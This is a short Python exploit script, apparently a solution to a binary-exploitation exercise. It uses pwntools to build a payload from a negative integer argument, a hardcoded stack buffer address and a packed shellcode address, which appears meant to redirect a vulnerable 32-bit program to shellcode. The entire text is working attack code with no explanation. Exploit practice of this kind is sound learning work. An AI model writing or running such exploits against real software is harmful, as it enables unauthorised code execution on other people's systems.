import sys
from pwn import *


buffer_address = 0xffffd2cc
shellcode_address = 0xffffd53c

arg1 = -1 
arg2 = buffer_address
arg3 = shellcode_address


payload = str(arg1).encode() + b' ' + hex(arg2).encode() + b' ' + p32(arg3)

sys.stdout.buffer.write(payload)
